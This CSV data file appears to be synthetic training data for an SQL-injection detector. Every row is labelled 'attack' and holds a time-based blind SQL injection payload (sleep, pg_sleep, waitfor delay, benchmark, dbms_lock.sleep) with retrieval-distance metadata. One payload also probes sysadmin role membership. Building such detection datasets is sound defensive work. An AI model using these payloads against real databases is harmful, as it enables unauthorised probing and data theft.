id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000047,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000205,1.149280613710727
SMOTE_000048,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000214,1.247656730725197
SMOTE_000049,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000218,0.715037264949887
SMOTE_000050,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000035,0.8225134156078372
SMOTE_000051,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000042,0.28025081420147935
SMOTE_000052,attack,time,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,nearest_attack_euclidean,R000211,1.9996004350519736
SMOTE_000053,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000135,0.0063968082810348355
SMOTE_000054,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.05049562027593676
SMOTE_000055,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000165,0.1486929766395193
SMOTE_000056,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,0.49054804345326525
SMOTE_000057,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000133,0.17306496711419106
SMOTE_000058,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000014,1.0598809102760038
SMOTE_000059,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,nearest_attack_euclidean,R000247,1.5108715637176617
SMOTE_000060,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000291,0.3858087124245422
SMOTE_000061,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000108,0.24014760077439967
SMOTE_000062,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000043,0.0648002158388358
SMOTE_000063,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000221,0.03301166250361258
SMOTE_000064,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000296,0.025124433491951568
SMOTE_000065,attack,time,"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000196,0.5567834371324318
SMOTE_000066,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000173,0.20007877646691025
SMOTE_000067,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000202,1.150886187790632
SMOTE_000068,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",nearest_attack_euclidean,R000215,0.642949403080479
SMOTE_000069,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000183,0.8009937102126853
SMOTE_000070,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000262,1.3155539501434819
SMOTE_000071,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000079,1.465738710625932
SMOTE_000072,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000172,0.7594672218383222
SMOTE_000073,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000181,2.0506977318854482
SMOTE_000074,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000026,0.7356972648681293
SMOTE_000075,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000063,0.7608045675824368
SMOTE_000076,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000048,3.077496922342035
SMOTE_000077,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.7518489039848721
SMOTE_000078,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000071,0.17730704233314326
SMOTE_000079,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000167,0.530433908503158
SMOTE_000080,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000223,0.8251872103889454
SMOTE_000081,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000231,0.3384435840271375
SMOTE_000082,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000026,0.07824465982257849
SMOTE_000083,attack,time,"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000196,0.5606437674689294
SMOTE_000084,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,nearest_attack_euclidean,R000247,0.5163739797867196
SMOTE_000085,attack,time,1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000127,1.0436664118994083
SMOTE_000086,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.9217978275813579
SMOTE_000087,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,nearest_attack_euclidean,R000312,1.2168493208718507
SMOTE_000088,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,1.4927505686054583
SMOTE_000089,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000289,0.5474997209545813
SMOTE_000090,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000259,0.49550569797790356
SMOTE_000091,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000048,1.2698718648746152
SMOTE_000092,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000253,1.0228642170386053
SMOTE_000093,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000139,1.190201814107648
SMOTE_000094,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,nearest_attack_euclidean,R000238,0.6071628829733188
SMOTE_000095,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000074,0.4398386918814409
SMOTE_000096,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000123,0.10450360524643042
SMOTE_000097,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.6675925509755408
SMOTE_000098,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000005,0.823395981380116
SMOTE_000099,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000242,1.3352608664145946
SMOTE_000100,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000068,1.6542603188654985
SMOTE_000101,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000163,1.2963403939061853
SMOTE_000102,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000168,0.4973418351916043
SMOTE_000103,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000002,1.9771604259833684
SMOTE_000104,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.14933251804584852
SMOTE_000105,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000226,1.133771755227082
SMOTE_000106,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000304,1.272462852331835
SMOTE_000107,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,0.6449591637765058
SMOTE_000108,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.5819350292815245
SMOTE_000109,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,1.522419443578067
SMOTE_000110,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000091,0.7309156109264485
SMOTE_000111,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000285,0.08572127535691076
SMOTE_000112,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000281,0.45186981652075026
SMOTE_000113,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000240,2.3914234113812523
SMOTE_000114,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",nearest_attack_euclidean,R000120,0.8011047367175157
SMOTE_000115,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000085,0.6514101723421554
SMOTE_000116,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R000302,1.8512652185461094
SMOTE_000117,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000289,0.03154794957778435
SMOTE_000118,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000021,1.6401552805084068
SMOTE_000119,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000219,1.0789606509524399
SMOTE_000120,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000113,0.2533524322297579
SMOTE_000121,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,1.1283233030393685
SMOTE_000122,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000141,0.016054069521335774
SMOTE_000123,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000051,1.4140693912958204
SMOTE_000124,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000273,0.7644818993648038
SMOTE_000125,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000264,0.030995061916474286
SMOTE_000126,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.5398128468750878
SMOTE_000127,attack,time,"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000146,0.27307826257880585
SMOTE_000128,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000006,0.02374687846246053
SMOTE_000129,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000036,0.6839410613802208
SMOTE_000130,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000018,2.0490315343332512
SMOTE_000131,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,0.9164627569970024
SMOTE_000132,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000072,0.7763785206857571
SMOTE_000133,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000055,0.25923770646242056
SMOTE_000134,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000011,0.8722096276969269
SMOTE_000135,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000065,0.12659913103349432
SMOTE_000136,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000307,0.32956687258348355
SMOTE_000137,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000081,0.901591213884836
SMOTE_000138,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000217,0.44532645805536936
SMOTE_000139,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000194,0.154923714324608
SMOTE_000140,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000064,0.13970656885864963
SMOTE_000141,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000230,0.6811190440281832
SMOTE_000142,attack,time,"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000146,0.6588008269424193
SMOTE_000143,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000223,0.4982641822284523
SMOTE_000144,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000010,0.0002526119666726428
SMOTE_000145,attack,time,"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000237,0.14690746620115555
SMOTE_000146,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R000295,0.20750091814245664
SMOTE_000147,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000053,0.680673333143968
SMOTE_000148,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,0.726231672034393
SMOTE_000149,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000102,1.2163407232972057
SMOTE_000150,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000167,0.46100494952240645
SMOTE_000151,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000181,0.08047078862874549
SMOTE_000152,attack,time,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",nearest_attack_euclidean,R000170,0.09628471381458666
SMOTE_000153,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,0.8988652347531003
SMOTE_000154,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000190,1.3203903643011372
SMOTE_000155,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",nearest_attack_euclidean,R000257,0.8280960376311726
SMOTE_000156,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000212,0.48485419032818616
SMOTE_000157,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000171,0.4729949971683882
SMOTE_000158,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000136,0.4603110842779618
SMOTE_000159,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000205,0.703526616728434
SMOTE_000160,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000177,0.11034501775660643
SMOTE_000161,attack,time,1%'   )    )     )   or sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000125,1.2340854556084602
SMOTE_000162,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.37212821977545407
SMOTE_000163,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000064,0.11380236348301474
SMOTE_000164,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000281,0.4664082703902582
SMOTE_000165,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000246,0.6378394823993998
SMOTE_000166,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000078,1.2190111340802967
SMOTE_000167,attack,time,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000103,0.266092160168366
SMOTE_000168,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R000302,0.279081311865452
SMOTE_000169,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000024,0.12920583752435313
SMOTE_000170,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000249,0.773476970435249
SMOTE_000171,attack,time,1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000142,0.6464673720337691
SMOTE_000172,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.7927926709428424
SMOTE_000173,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",nearest_attack_euclidean,R000215,0.5506170098238585
SMOTE_000174,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000198,0.0146999526838915
SMOTE_000175,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000173,0.6269725859825157
